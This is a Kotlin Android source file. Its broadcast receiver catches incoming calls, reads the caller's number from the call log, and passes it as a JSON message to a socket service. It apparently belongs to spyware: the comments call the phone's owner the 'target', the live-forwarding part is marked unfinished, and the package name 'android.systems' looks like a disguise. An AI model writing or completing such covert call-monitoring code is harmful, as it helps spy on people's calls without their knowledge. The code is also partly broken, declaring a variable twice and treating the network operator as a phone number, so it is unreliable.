package android.systems.myapplication

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.CallLog
import android.telephony.TelephonyManager

class StatusReceiver:BroadcastReceiver() {
    @SuppressLint("Range")
    override fun onReceive(context: Context?, intent: Intent?) {
        if(intent?.action == "android.intent.action.PHONE_STATE"){
          
            //receive whenever target gets a phone call
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            if(state == TelephonyManager.EXTRA_STATE_RINGING){
                val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
                val telephonyManager = context?.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val phoneNumber = telephonyManager.networkOperator

                val contentResolver = context?.contentResolver
                val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE)
                val cursor = contentResolver?.query(CallLog.Calls.CONTENT_URI, projection, null, null, null)
                if (cursor != null && cursor.moveToLast()) {
                    //this contains the phone number target receiving
                    val incomingNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                    println("----------------------------------call--------------")
                    
                    println("Incoming call from $incomingNumber or $phoneNumber")
                    var objToString = "{\"type\":\"incomingCall\",\"number\":\"$incomingNumber\"}"
                    val incomingCallLive = Intent(context,SocketConnectionSetup::class.java)
                    
                    //to sent to Socket Io class (SocketConnectionSetup.kt) Not Completed Yet
                    incomingCallLive.putExtra("message",objToString)
                    context.startService(incomingCallLive)
                }

            }
        }
    }
}
